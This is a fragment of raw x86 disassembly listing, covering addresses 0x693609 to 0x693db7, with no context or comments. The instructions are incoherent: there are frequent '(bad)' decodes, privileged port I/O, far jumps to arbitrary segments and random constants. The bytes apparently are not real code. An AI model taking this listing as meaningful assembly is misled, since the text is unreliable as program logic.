  693609:	pop    edi
  69360a:	push   es
  69360b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69360c:	sbb    eax,0xfbd9c083
  693611:	call   0x27c1:0xb967f4bc
  693618:	in     eax,0x99
  69361a:	mov    bl,0x46
  69361c:	jmp    0x19c7:0x264f6d8f
  693623:	or     cl,0x78
  693626:	fucomi st,st(2)
  693628:	(bad)  [edx+esi*1-0x5773d84]
  69362f:	xor    ecx,0x79e7280e
  693635:	jbe    0x693649
  693637:	out    0xf4,al
  693639:	cdq    
  69363a:	call   0x3d1bfd62
  69363f:	add    bh,ch
  693641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  693642:	outs   dx,DWORD PTR ds:[esi]
  693643:	dec    edi
  693644:	js     0x693630
  693646:	inc    ebp
  693647:	ss iret 
  693649:	adc    BYTE PTR [edi-0x12],dl
  69364c:	add    al,0x41
  69364e:	popf   
  69364f:	push   eax
  693650:	pop    ss
  693651:	fisttp QWORD PTR [ecx+0x30]
  693654:	scas   eax,DWORD PTR es:[edi]
  693655:	into   
  693656:	rcl    eax,1
  693658:	inc    esi
  693659:	mov    al,0x92
  69365b:	inc    eax
  69365c:	pop    ds
  69365d:	iret   
  69365e:	cmp    al,0xc0
  693660:	xor    eax,0xfe3cfc1f
  693665:	(bad)  
  693667:	and    al,0xa2
  693669:	cmc    
  69366a:	test   al,0xd3
  69366c:	push   cs
  69366d:	and    BYTE PTR [ebp+0x7a1f08c3],ch
  693673:	inc    eax
  693674:	dec    ebx
  693675:	bound  esi,QWORD PTR [ecx+edi*1+0x70521c89]
  69367c:	icebp  
  69367d:	inc    edi
  69367e:	sub    DWORD PTR [esi],ebx
  693680:	push   ss
  693681:	iret   
  693682:	add    eax,0xe7c3ae2e
  693687:	jp     0x69364a
  693689:	inc    edx
  69368a:	mov    ch,BYTE PTR [eax-0x6b8ea91c]
  693690:	in     al,dx
  693691:	sti    
  693692:	pop    eax
  693693:	mov    ebx,0xb02678dc
  693698:	fs out dx,eax
  69369a:	jae    0x693675
  69369c:	and    al,0xca
  69369e:	out    0xfb,al
  6936a0:	push   es
  6936a1:	add    eax,0x3a15280
  6936a6:	in     eax,0x81
  6936a8:	jmp    0x6936be
  6936aa:	cwde   
  6936ab:	pop    ebp
  6936ac:	pop    eax
  6936ad:	mov    ah,0x9b
  6936af:	leave  
  6936b0:	or     dl,BYTE PTR ss:[esi-0x438cbc45]
  6936b7:	push   ecx
  6936b8:	(bad)  
  6936b9:	aas    
  6936ba:	push   eax
  6936bb:	idiv   DWORD PTR [edi]
  6936bd:	cli    
  6936be:	aas    
  6936bf:	jl     0x6936d0
  6936c1:	sahf   
  6936c2:	jnp    0x693708
  6936c4:	mov    bh,BYTE PTR [ebx-0x4418ac7b]
  6936ca:	xchg   ebp,eax
  6936cb:	adc    eax,esi
  6936cd:	jp     0x693724
  6936cf:	sub    edi,DWORD PTR [ebp+0x44]
  6936d2:	sahf   
  6936d3:	das    
  6936d4:	stos   DWORD PTR es:[edi],eax
  6936d5:	sar    BYTE PTR [esi],cl
  6936d7:	sbb    ebx,esi
  6936d9:	add    BYTE PTR [eax+0x3],dl
  6936dc:	into   
  6936dd:	mov    ebp,0x3eabc28c
  6936e2:	in     eax,dx
  6936e3:	sub    DWORD PTR [edx+0xbe1ff34],ecx
  6936e9:	mov    ecx,0xe0a819d2
  6936ee:	pop    ds
  6936ef:	fidiv  DWORD PTR [ecx]
  6936f1:	push   ds
  6936f2:	stos   DWORD PTR es:[edi],eax
  6936f3:	sbb    DWORD PTR ss:[esi+0x1d],eax
  6936f7:	xchg   eax,esp
  6936f9:	mov    ecx,DWORD PTR [ecx]
  6936fb:	jb     0x6936ef
  6936fd:	shr    BYTE PTR [ecx],1
  6936ff:	inc    ecx
  693700:	mov    bl,0xa3
  693702:	xchg   ebp,eax
  693703:	inc    edi
  693704:	and    edi,ebp
  693706:	sbb    al,0x84
  693708:	sbb    DWORD PTR [esi],ebp
  69370a:	shr    DWORD PTR [ebx],0xcb
  69370d:	retf   
  69370e:	inc    ebp
  69370f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  693710:	mov    ebp,DWORD PTR [eax+0x5779f3d2]
  693716:	cmp    BYTE PTR [edi-0x5e],bh
  693719:	lahf   
  69371a:	call   0xe03e:0x332ad11a
  693721:	mov    ?,WORD PTR [edi-0x5bc90e3c]
  693727:	lods   eax,DWORD PTR ds:[esi]
  693728:	mov    dl,0x8b
  69372a:	mov    bh,dl
  69372c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69372d:	aad    0xae
  69372f:	xor    esi,DWORD PTR [eax+0x5b474e24]
  693735:	xor    eax,0x8ff8c2b9
  69373a:	fs call 0x285a:0x7de02194
  693742:	fs int 0x81
  693745:	sub    BYTE PTR [esi+0x29],dh
  693748:	mov    eax,ds:0x3b030ffe
  69374d:	ds push ebp
  69374f:	aad    0x45
  693751:	ins    DWORD PTR es:[edi],dx
  693752:	outs   dx,BYTE PTR ds:[esi]
  693753:	imul   edi,DWORD PTR [bx+di],0xda51d144
  69375a:	inc    esp
  69375b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69375c:	xor    al,0x79
  69375e:	ret    0xeb59
  693761:	pop    eax
  693762:	(bad)  
  693763:	loop   0x6937a5
  693765:	stc    
  693766:	sahf   
  693767:	mov    dl,0x2f
  693769:	aas    
  69376a:	ficomp WORD PTR [esi]
  69376c:	imul   edx,esi,0xa
  69376f:	test   eax,0xa8d7f260
  693774:	in     al,0x76
  693776:	repz lds eax,FWORD PTR [ebp-0x445ffd4]
  69377d:	add    bh,dh
  69377f:	mov    esi,0x32320e11
  693784:	retf   0xc440
  693787:	shl    DWORD PTR [ebp+0x55],cl
  69378a:	loope  0x69370d
  69378c:	or     DWORD PTR [ebx],ecx
  69378e:	sahf   
  69378f:	popf   
  693790:	test   al,0xd9
  693792:	or     ah,BYTE PTR [ebx+0x7a]
  693795:	dec    ebx
  693796:	faddp  st(6),st
  693798:	(bad)  
  693799:	sbb    esi,DWORD PTR [ebx]
  69379b:	jmp    0x3b16c837
  6937a0:	sar    edi,1
  6937a2:	mov    bh,0xd9
  6937a4:	or     esi,DWORD PTR [ebp+0x38]
  6937a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6937a8:	sahf   
  6937a9:	jno    0x693806
  6937ab:	jo     0x6937d7
  6937ad:	jb     0x69379f
  6937af:	nop
  6937b0:	mov    cl,0xdf
  6937b2:	scas   eax,DWORD PTR es:[edi]
  6937b3:	lods   eax,DWORD PTR ds:[esi]
  6937b5:	mov    eax,ds:0x7da86960
  6937ba:	add    eax,0xb0a7d027
  6937bf:	xchg   esi,eax
  6937c0:	push   ecx
  6937c1:	aas    
  6937c2:	test   DWORD PTR ds:0x2dd8794f,0x8ff2d688
  6937cc:	bound  ecx,QWORD PTR [ebx+edi*4]
  6937cf:	rol    DWORD PTR [esi+0x5c],cl
  6937d2:	adc    DWORD PTR [ebx],ebp
  6937d4:	mov    DWORD PTR [ecx+edi*1-0x5e4c8d7a],eax
  6937db:	inc    ecx
  6937dc:	cmc    
  6937dd:	push   0x987b4ece
  6937e2:	aas    
  6937e3:	push   eax
  6937e4:	and    ecx,ebx
  6937e6:	push   edi
  6937e7:	sub    DWORD PTR [ebp+0x48],0x6b
  6937eb:	jo     0x693803
  6937ed:	jle    0x6937dc
  6937ef:	adc    bh,cl
  6937f1:	jae    0x69378f
  6937f3:	bound  edi,QWORD PTR [ebx+0x4c544fee]
  6937f9:	lods   eax,DWORD PTR ds:[esi]
  6937fa:	mov    bl,0xb1
  6937fc:	ins    DWORD PTR es:[edi],dx
  6937fd:	or     esi,edx
  6937ff:	fwait
  693800:	add    al,BYTE PTR [esi-0x20fff84d]
  693806:	or     eax,0x1fbedd38
  69380b:	push   0xffffffeb
  69380d:	shl    BYTE PTR [ebx+0x5a7f1147],1
  693813:	cmp    BYTE PTR [eax-0x1c],0x82
  693817:	jmp    0x86883f3c
  69381c:	adc    ah,BYTE PTR [edi-0x468f810b]
  693822:	or     BYTE PTR [eax+0x3eacaf20],bh
  693828:	cli    
  693829:	sub    bl,bl
  69382b:	clc    
  69382c:	aas    
  69382d:	inc    esi
  69382e:	xor    eax,0x11f33331
  693833:	nop
  693834:	js     0x6937fe
  693836:	inc    DWORD PTR [ebp+0x721991e1]
  69383c:	pushf  
  69383d:	clc    
  69383e:	or     bh,BYTE PTR [eax]
  693840:	push   edi
  693841:	mov    cl,0x2
  693843:	cld    
  693844:	mov    cl,0x3f
  693846:	jno    0x693835
  693848:	sub    DWORD PTR [eax+0x2f57902b],ebx
  69384e:	mov    ebp,0x5c4bb012
  693853:	xor    BYTE PTR [esi+0x6496361f],0xf0
  69385a:	xchg   edi,eax
  69385b:	jl     0x693815
  69385d:	lods   eax,DWORD PTR ds:[esi]
  69385e:	mov    BYTE PTR [edi],0xf8
  693861:	dec    esp
  693862:	xor    BYTE PTR [esi],ah
  693864:	push   0x7687138
  693869:	in     eax,dx
  69386a:	cmp    BYTE PTR [edi+0x25],0x7e
  69386e:	and    ecx,DWORD PTR [ebp-0x4b]
  693871:	cs jl  0x693816
  693874:	call   0xe37e3075
  693879:	jno    0x693867
  69387b:	ins    DWORD PTR es:[edi],dx
  69387c:	(bad)  
  69387d:	push   ds
  69387e:	pusha  
  69387f:	mov    DWORD PTR [ecx],esp
  693881:	add    DWORD PTR [ecx],esi
  693883:	adc    al,0x8a
  693885:	ficom  DWORD PTR [esi-0x3c]
  693888:	jns    0x693888
  69388a:	pop    ss
  69388b:	and    esp,DWORD PTR [ebx+0x452ffab7]
  693891:	add    BYTE PTR [ebx+eiz*4],ah
  693894:	pop    edi
  693895:	xlat   BYTE PTR ds:[ebx]
  693896:	jle    0x69390d
  693898:	gs mov gs,edi
  69389b:	test   DWORD PTR [edi-0x37],ebx
  69389e:	add    dl,dh
  6938a0:	xchg   esi,eax
  6938a1:	dec    eax
  6938a2:	pop    ss
  6938a3:	mov    eax,0x50ec2aa7
  6938a8:	sbb    al,0xb0
  6938aa:	cmp    al,0x83
  6938ac:	sbb    al,0x15
  6938ae:	mov    edi,0x5990fb18
  6938b3:	aad    0x2
  6938b5:	out    dx,al
  6938b6:	outs   dx,BYTE PTR ds:[esi]
  6938b7:	pop    ebp
  6938b8:	gs loope 0x693892
  6938bb:	mov    bh,BYTE PTR [esi+edx*4]
  6938be:	sahf   
  6938bf:	cmp    ch,BYTE PTR [ebx-0x1bfa881a]
  6938c5:	cmp    BYTE PTR [eax],0x5e
  6938c8:	aaa    
  6938c9:	pusha  
  6938ca:	sti    
  6938cb:	lds    edx,FWORD PTR [edi-0x11]
  6938ce:	pop    esi
  6938cf:	out    dx,al
  6938d0:	dec    edx
  6938d1:	dec    edx
  6938d2:	leave  
  6938d3:	out    0xbe,al
  6938d5:	xor    ah,BYTE PTR [edx+0x47]
  6938d8:	outs   dx,DWORD PTR ds:[esi]
  6938d9:	aam    0x76
  6938db:	cwde   
  6938dc:	mov    edi,0xfd71cda
  6938e1:	dec    ecx
  6938e2:	mov    dl,0x15
  6938e4:	mov    esp,0x3160214d
  6938e9:	out    dx,eax
  6938ea:	std    
  6938eb:	popaw  
  6938ed:	retf   
  6938ee:	idiv   eax
  6938f0:	push   ebp
  6938f1:	stos   BYTE PTR es:[edi],al
  6938f2:	outs   dx,DWORD PTR ds:[esi]
  6938f3:	mov    bl,0xf7
  6938f5:	jo     0x693886
  6938f7:	lahf   
  6938f8:	gs stc 
  6938fa:	jle    0x69394c
  6938fc:	stc    
  6938fd:	dec    eax
  6938fe:	and    al,0x4b
  693900:	add    bh,bl
  693902:	test   BYTE PTR [esi+0xa],ch
  693905:	pop    DWORD PTR [esi-0x70ec6839]
  69390b:	inc    ebp
  69390c:	scas   eax,DWORD PTR es:[edi]
  69390d:	push   edx
  69390e:	dec    ecx
  69390f:	call   0x203b:0x731f1649
  693916:	xchg   esi,eax
  693917:	push   ecx
  693918:	sti    
  693919:	popf   
  69391a:	cli    
  69391b:	stos   DWORD PTR es:[edi],eax
  69391c:	mov    ds:0xa3bf9ad6,al
  693921:	sti    
  693922:	pop    eax
  693923:	(bad)  
  693924:	jmp    0x9e28:0xb8e4663e
  69392b:	pop    esi
  69392c:	adc    eax,0xcc391ab4
  693931:	mov    ebx,0xdc421562
  693936:	jb     0x6938c0
  693938:	mov    eax,0x338f59c6
  69393d:	sbb    eax,0x8dffdf67
  693942:	and    al,0x74
  693944:	stc    
  693945:	sete   BYTE PTR [esi]
  693948:	in     eax,0x99
  69394a:	bnd jge 0x6939a6
  69394d:	jp     0x69390b
  69394f:	lock in al,dx
  693951:	and    eax,esi
  693953:	xchg   ecx,eax
  693954:	jns    0x6939a0
  693956:	or     DWORD PTR [ebp+0x4b666abd],ecx
  69395c:	retf   0x4e16
  69395f:	adc    al,0x59
  693961:	fld    DWORD PTR [ebp+0x11638cb7]
  693967:	out    dx,al
  693968:	or     al,dh
  69396a:	leave  
  69396b:	mov    dl,0xfa
  69396d:	inc    esi
  69396e:	jno    0x69390f
  693970:	sbb    DWORD PTR [edx],edi
  693972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  693973:	add    ebx,ebx
  693975:	popf   
  693976:	xchg   BYTE PTR [ecx-0x2a],dl
  693979:	pop    esp
  69397a:	in     eax,dx
  69397b:	cwde   
  69397c:	sub    ecx,DWORD PTR [eax]
  69397e:	leave  
  69397f:	mov    esp,DWORD PTR [ebp-0xde245d9]
  693985:	mov    edi,0x4d90f4a4
  69398a:	dec    eax
  69398b:	pop    ebx
  69398c:	push   esi
  69398d:	or     esi,DWORD PTR [esi]
  69398f:	push   ecx
  693990:	xor    BYTE PTR [ebp+ecx*4+0x3a],bl
  693994:	and    al,0x97
  693996:	sub    al,0xc9
  693998:	shr    BYTE PTR [eax-0x34fe1701],0xd7
  69399f:	mov    ch,0x20
  6939a1:	icebp  
  6939a2:	into   
  6939a3:	xor    eax,0x3bb31d0e
  6939a8:	repnz daa 
  6939aa:	(bad)  
  6939ab:	jp     0x6939ac
  6939ad:	push   edx
  6939ae:	lods   al,BYTE PTR ds:[esi]
  6939af:	in     al,dx
  6939b0:	pop    ds
  6939b1:	loope  0x6939c3
  6939b3:	mov    edi,0x8c82c62b
  6939b8:	adc    bh,ch
  6939ba:	adc    BYTE PTR [edx+0x34],0xb0
  6939be:	push   cs
  6939bf:	jmp    0xc434:0xc7de5d41
  6939c6:	fldcw  WORD PTR [edx]
  6939c8:	loop   0x693a35
  6939ca:	push   edi
  6939cb:	aam    0x4f
  6939cd:	inc    ebx
  6939ce:	fdivr  DWORD PTR [eax+edx*1]
  6939d1:	dec    ebp
  6939d2:	gs jle 0x693977
  6939d5:	lds    esp,FWORD PTR [eax+0x41]
  6939d8:	or     ah,dh
  6939da:	and    ebx,DWORD PTR [eax+edx*2+0x527c3958]
  6939e1:	mov    ch,0xdf
  6939e3:	(bad)  
  6939e4:	sub    DWORD PTR [ebx],ecx
  6939e6:	mov    WORD PTR [ecx],ss
  6939e8:	outs   dx,BYTE PTR ds:[esi]
  6939e9:	jo     0x693a5c
  6939eb:	mov    BYTE PTR gs:[esi+edi*8+0x71c82c1b],dh
  6939f3:	sahf   
  6939f4:	in     eax,0xc8
  6939f6:	xchg   esi,eax
  6939f7:	dec    esp
  6939f8:	mov    ebx,0x985b8ab4
  6939fd:	out    0xd2,al
  6939ff:	mov    esp,0x8165bf19
  693a04:	mov    ds:0xb03fc838,eax
  693a09:	sub    al,0xe9
  693a0b:	je     0x6939e7
  693a0d:	pop    ebx
  693a0e:	xor    dh,BYTE PTR [edx-0x4d892615]
  693a14:	xchg   ebx,eax
  693a15:	shr    BYTE PTR [eax-0x7],cl
  693a18:	iret   
  693a19:	pushf  
  693a1a:	ja     0x693a38
  693a1c:	pop    es
  693a1d:	xchg   ebp,eax
  693a1e:	scas   al,BYTE PTR es:[edi]
  693a1f:	sbb    DWORD PTR [edi-0x16],edx
  693a22:	inc    si
  693a24:	data16 std 
  693a26:	test   esi,eax
  693a28:	je     0x6939dd
  693a2a:	lds    esp,FWORD PTR [edi+0x2a088efd]
  693a30:	retf   0x410f
  693a33:	mov    ebp,gs
  693a35:	addr16 fs jge 0x693a26
  693a39:	cwde   
  693a3a:	add    eax,0xdb83214d
  693a3f:	cmp    al,0x90
  693a41:	push   0x7
  693a43:	and    esi,esi
  693a45:	or     eax,eax
  693a47:	mov    bl,0xbf
  693a49:	push   edx
  693a4a:	not    BYTE PTR [edi-0x48]
  693a4d:	cdq    
  693a4e:	(bad)  
  693a4f:	jmp    0xb8e:0xd069249e
  693a56:	fld    DWORD PTR [ebx+ebx*2+0x6d]
  693a5a:	and    eax,0xba078743
  693a5f:	pop    edi
  693a60:	push   eax
  693a61:	and    DWORD PTR [eax-0x2d],eax
  693a64:	arpl   WORD PTR [esi+0x190e058a],bp
  693a6a:	pop    esp
  693a6b:	shl    ch,1
  693a6d:	cmc    
  693a6e:	imul   edi,DWORD PTR [ebp+0x74],0x77
  693a72:	aas    
  693a73:	mov    edi,0x789776d4
  693a78:	stos   DWORD PTR es:[edi],eax
  693a79:	mov    ecx,0x8163ac23
  693a7e:	sbb    eax,0xbca0e50a
  693a83:	fiadd  DWORD PTR [edi]
  693a85:	ins    DWORD PTR es:[edi],dx
  693a86:	push   ebx
  693a87:	jne    0x693a62
  693a89:	aam    0xf7
  693a8b:	or     al,0x9b
  693a8d:	sbb    edi,eax
  693a8f:	xchg   esp,eax
  693a90:	and    al,0x41
  693a92:	inc    esi
  693a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  693a94:	retf   0x9a4d
  693a97:	(bad)  
  693a98:	cld    
  693a99:	dec    eax
  693a9a:	aaa    
  693a9b:	stos   BYTE PTR es:[edi],al
  693a9c:	dec    ebx
  693a9d:	mov    al,0x44
  693a9f:	mov    ebx,0x3c5f468f
  693aa4:	mov    cl,0x1
  693aa6:	dec    esp
  693aa7:	xchg   edx,eax
  693aa8:	adc    ebp,DWORD PTR [ebx-0x3aad586e]
  693aae:	ret    
  693aaf:	fist   DWORD PTR [edx+0x19]
  693ab2:	aaa    
  693ab3:	pop    edi
  693ab4:	mov    eax,ds:0xbb53ee74
  693ab9:	in     al,dx
  693aba:	pop    ebp
  693abb:	lds    edx,FWORD PTR [esi]
  693abd:	push   cs
  693abe:	pusha  
  693abf:	dec    esi
  693ac0:	sti    
  693ac1:	adc    DWORD PTR [ecx+0x2da6fcaf],esi
  693ac7:	push   edx
  693ac8:	and    bl,BYTE PTR [ecx+0x29677fbb]
  693ace:	mov    dl,0xf2
  693ad0:	mov    ch,0x9c
  693ad2:	xchg   ebp,eax
  693ad3:	mov    bl,0xfa
  693ad5:	and    bh,BYTE PTR ds:0x449d337c
  693adb:	xchg   ebx,eax
  693adc:	shr    BYTE PTR [esi],1
  693ade:	sub    eax,0xbd0eb6d1
  693ae3:	mov    DWORD PTR [edx],0xcda1f747
  693ae9:	(bad)  
  693aea:	xlat   BYTE PTR ds:[ebx]
  693aeb:	nop
  693aec:	mov    esp,0x1a8b8ac1
  693af1:	push   esp
  693af2:	jmp    0x460c:0x924e5ce
  693af9:	adc    BYTE PTR [esi+0x4105ee74],al
  693aff:	dec    ecx
  693b00:	pop    ecx
  693b01:	add    ebp,DWORD PTR [esi+0x66]
  693b04:	arpl   WORD PTR [ebx+0x3ca60aa0],bx
  693b0a:	into   
  693b0b:	xor    ebx,DWORD PTR [ecx+0x11]
  693b0e:	xor    dh,BYTE PTR [esi]
  693b10:	mov    cl,0x40
  693b12:	inc    esp
  693b13:	enter  0xe644,0x4c
  693b17:	add    al,dl
  693b19:	adc    eax,0x9264dcf1
  693b1e:	retf   0x3f3
  693b21:	std    
  693b22:	enter  0x233e,0x3e
  693b26:	push   ds
  693b27:	mov    ch,0x41
  693b29:	or     DWORD PTR [edx+0x76e59b57],eax
  693b2f:	adc    DWORD PTR [esi],edi
  693b31:	jmp    0x693b5f
  693b33:	lahf   
  693b34:	jb     0x693b6e
  693b36:	sub    al,0xd2
  693b38:	loopne 0x693abc
  693b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  693b3b:	clc    
  693b3c:	ret    
  693b3d:	or     bh,BYTE PTR [ebx+0x440a1e14]
  693b43:	pop    ebx
  693b44:	inc    edx
  693b45:	and    al,BYTE PTR [esi+eiz*8]
  693b48:	pop    es
  693b49:	fistp  DWORD PTR [edx-0x46f25909]
  693b4f:	mov    ebp,0x3fb4a9ff
  693b54:	inc    edx
  693b55:	jno    0x693b5b
  693b57:	inc    eax
  693b58:	shr    DWORD PTR [ebx+ecx*1-0x5cad3785],cl
  693b5f:	inc    edi
  693b60:	cld    
  693b61:	xor    al,0xc3
  693b63:	sbb    al,0xa8
  693b65:	cmp    DWORD PTR [edx-0x2a8e35fe],edx
  693b6b:	mov    es,WORD PTR [ebx-0x2288105b]
  693b71:	mov    eax,0xa4f3dd9f
  693b76:	into   
  693b77:	in     al,dx
  693b78:	jl     0x693bd5
  693b7a:	cli    
  693b7b:	test   al,dh
  693b7d:	call   0x986b:0x9e6f0bd2
  693b84:	fwait
  693b85:	test   eax,0xd935d3b0
  693b8a:	push   esi
  693b8b:	pusha  
  693b8c:	cmc    
  693b8d:	add    edx,edi
  693b8f:	ja     0x693bc5
  693b91:	inc    edi
  693b92:	pop    esi
  693b93:	push   esp
  693b94:	cmp    eax,0x54b3ce05
  693b99:	xchg   edx,eax
  693b9a:	xchg   esp,eax
  693b9b:	lds    edi,FWORD PTR [edx+0x44859be0]
  693ba1:	xchg   BYTE PTR [edi+eax*4-0xc7c6540],al
  693ba8:	cmp    al,0xe2
  693baa:	vpcmpgtb xmm0,xmm4,xmm5
  693bae:	enter  0x715f,0x9
  693bb2:	push   edx
  693bb3:	daa    
  693bb4:	pop    eax
  693bb5:	aam    0xe0
  693bb7:	xchg   edx,eax
  693bb8:	pmaxub mm5,QWORD PTR [edi+ebp*2-0x4af0a4e2]
  693bc0:	ins    BYTE PTR es:[edi],dx
  693bc1:	je     0x693ba2
  693bc3:	test   eax,0x5b9a5ffb
  693bc8:	xchg   ecx,eax
  693bc9:	xchg   edx,eax
  693bca:	js     0x693c00
  693bcc:	test   esp,edi
  693bce:	pmuludq mm1,QWORD PTR [ebx-0x4fce4b9f]
  693bd5:	fs sbb al,0x55
  693bd8:	push   esi
  693bd9:	mov    ebx,0x3af00b82
  693bde:	and    DWORD PTR [edi+0x478cc6e9],esp
  693be4:	mov    bl,0xb3
  693be6:	test   DWORD PTR [edx-0x436a6988],ebx
  693bec:	fucomi st,st(5)
  693bee:	int3   
  693bef:	(bad)  
  693bf0:	cdq    
  693bf1:	xchg   edi,eax
  693bf2:	or     edi,DWORD PTR [edi]
  693bf4:	in     eax,dx
  693bf5:	es push ds
  693bf7:	loope  0x693c3d
  693bf9:	cli    
  693bfa:	imul   eax,edx,0x13803922
  693c00:	sbb    BYTE PTR [ebx],cl
  693c02:	mov    ebx,DWORD PTR [ecx+eax*1+0x3d2202a]
  693c09:	pushf  
  693c0a:	sub    al,0x9d
  693c0c:	inc    esi
  693c0d:	sub    ch,BYTE PTR ds:0x97d0d235
  693c13:	mov    ss,WORD PTR [ebp+0x16]
  693c16:	mov    ah,0x35
  693c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  693c19:	and    BYTE PTR [ebp+0x1c],bl
  693c1c:	nop
  693c1d:	jnp    0x693bdd
  693c1f:	or     al,0xdf
  693c21:	lods   al,BYTE PTR ds:[esi]
  693c22:	mov    dh,0xe1
  693c24:	adc    ebp,eax
  693c26:	pop    es
  693c27:	stos   DWORD PTR es:[edi],eax
  693c28:	sbb    al,0xe9
  693c2a:	push   es
  693c2b:	shl    BYTE PTR [esp+edi*2-0x65cc6c26],0xea
  693c33:	xchg   esi,eax
  693c34:	jb     0x693c35
  693c36:	push   es
  693c37:	and    bh,BYTE PTR [edi+0x11]
  693c3a:	bswap  esp
  693c3c:	jl     0x693ca2
  693c3e:	pop    esi
  693c3f:	fcom   QWORD PTR [eax]
  693c41:	sub    BYTE PTR [edi+0x49ed3be3],bl
  693c47:	mov    BYTE PTR [ebp+0x28],0xa2
  693c4b:	out    dx,eax
  693c4c:	add    BYTE PTR [edx+0x8],bh
  693c4f:	adc    BYTE PTR [ecx],cl
  693c51:	push   esi
  693c52:	xor    ebx,DWORD PTR [edx+0x53]
  693c55:	adc    esi,edi
  693c57:	(bad)  
  693c58:	or     ah,BYTE PTR [esi-0x30aa6e49]
  693c5e:	push   cs
  693c5f:	xor    al,0x77
  693c61:	nop
  693c62:	pop    edi
  693c63:	sub    DWORD PTR [edx],esp
  693c65:	div    edi
  693c67:	call   0x92d7:0xcc26fdff
  693c6e:	(bad)  
  693c6f:	push   0x37a95557
  693c74:	rol    DWORD PTR [edi-0x74],1
  693c77:	add    cl,al
  693c79:	loopne 0x693c43
  693c7b:	into   
  693c7c:	(bad)  
  693c7d:	xor    DWORD PTR [esi+edx*1-0x37096e12],esi
  693c84:	imul   esi,edx,0x4a78e0d5
  693c8a:	xor    eax,0xe64807f9
  693c8f:	and    DWORD PTR [esi],edx
  693c91:	inc    ecx
  693c92:	fnstsw WORD PTR [edx+0x8f67253]
  693c98:	mov    ch,0xee
  693c9a:	dec    ebx
  693c9b:	jg     0x693cdc
  693c9d:	les    esi,FWORD PTR [esi-0x71]
  693ca0:	sub    DWORD PTR [esi+0x8612155],esp
  693ca6:	pop    eax
  693ca7:	loopne 0x693cfe
  693ca9:	cdq    
  693caa:	or     BYTE PTR [edi-0x7a70e0b],dh
  693cb0:	mov    edx,DWORD PTR [esi+0x4fcdc763]
  693cb6:	mov    WORD PTR [eax+0x30bf517c],?
  693cbc:	xchg   edx,eax
  693cbd:	loope  0x693cc1
  693cbf:	hlt    
  693cc0:	sbb    eax,0x47cd331
  693cc5:	(bad)  
  693cc6:	jne    0x693c49
  693cc8:	(bad)  
  693cc9:	div    BYTE PTR [ebp+0x52cf8f09]
  693ccf:	sub    DWORD PTR [edi],edx
  693cd1:	into   
  693cd2:	out    dx,eax
  693cd3:	mov    ss,edi
  693cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  693cd6:	nop
  693cd7:	mov    edi,0xcf49b197
  693cdc:	inc    eax
  693cdd:	jge    0x693cd3
  693cdf:	imul   eax,edx,0xffffff94
  693ce2:	dec    ebp
  693ce3:	scas   al,BYTE PTR es:[edi]
  693ce4:	and    ch,ch
  693ce6:	mov    DWORD PTR [esi+0xc5422f6],esp
  693cec:	pop    ds
  693ced:	test   BYTE PTR [esi+ebp*1-0x4a09c477],cl
  693cf4:	mov    edx,0x40020afc
  693cf9:	(bad)  
  693cfa:	out    0x97,al
  693cfc:	add    DWORD PTR [esi-0x18dd15c8],edx
  693d02:	ins    DWORD PTR es:[edi],dx
  693d03:	dec    eax
  693d04:	nop
  693d05:	push   ebp
  693d06:	lock ins DWORD PTR es:[edi],dx
  693d08:	mov    eax,0x95c2adcf
  693d0d:	dec    ebx
  693d0e:	mov    al,ds:0xc0d0ca20
  693d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  693d14:	mov    ds:0x268a98bf,eax
  693d19:	outs   dx,BYTE PTR ds:[esi]
  693d1a:	fcmovne st,st(5)
  693d1c:	loope  0x693cd8
  693d1e:	mov    ds:0x85b507d1,eax
  693d23:	retf   0xca3e
  693d26:	mov    eax,ds:0x2b9ef869
  693d2b:	leave  
  693d2c:	fisttp DWORD PTR [eax]
  693d2e:	test   DWORD PTR [ebp-0x35],ebx
  693d31:	imul   edx,DWORD PTR [ebx],0x59
  693d34:	dec    ebx
  693d35:	aam    0xc8
  693d37:	out    dx,eax
  693d38:	sar    edi,cl
  693d3a:	cwde   
  693d3b:	push   esp
  693d3c:	ror    esp,0x8e
  693d3f:	leave  
  693d40:	add    ah,BYTE PTR [ebp+0x4ae415fc]
  693d46:	push   ss
  693d47:	sbb    edi,DWORD PTR [edx-0x3b]
  693d4a:	repz cmp bh,BYTE PTR [esi-0x3d]
  693d4e:	adc    DWORD PTR [edx+0x54407533],eax
  693d54:	or     al,0x2a
  693d56:	ret    
  693d57:	pop    ss
  693d58:	add    dh,BYTE PTR [ecx]
  693d5a:	repz push edx
  693d5c:	mov    dh,0xf
  693d5e:	test   BYTE PTR [ebx+0x461225da],bl
  693d64:	sub    al,ah
  693d66:	div    DWORD PTR [edx]
  693d68:	fstp   DWORD PTR [eax]
  693d6a:	add    eax,0x40fa6795
  693d6f:	(bad)  
  693d70:	repz dec edi
  693d72:	leave  
  693d73:	data16 fidivr DWORD PTR [edx+0x15]
  693d77:	hlt    
  693d78:	jno    0x693d0c
  693d7a:	arpl   WORD PTR [ecx+0x6d2cb2e],dx
  693d80:	sbb    BYTE PTR [ebx-0x8540ee],cl
  693d86:	dec    esi
  693d87:	retf   
  693d88:	push   edi
  693d89:	xchg   edi,eax
  693d8a:	jmp    0xe96af41a
  693d8f:	push   ss
  693d90:	dec    edx
  693d91:	leave  
  693d92:	jl     0x693d74
  693d94:	xor    dh,BYTE PTR ds:0x2d5c0f2d
  693d9a:	scas   eax,DWORD PTR es:[edi]
  693d9b:	sub    DWORD PTR [edi+ecx*1+0x489276a3],ebp
  693da2:	fs cmp eax,0x32601f84
  693da8:	in     al,dx
  693da9:	loopne 0x693d51
  693dab:	pop    es
  693dac:	popa   
  693dad:	sub    edi,DWORD PTR [edi+eiz*8]
  693db0:	iret   
  693db1:	outs   dx,DWORD PTR ds:[esi]
  693db2:	jbe    0x693d74
  693db4:	inc    ebx
  693db5:	xchg   esi,eax
  693db6:	xchg   edi,eax
  693db7:	add    edi,ebp
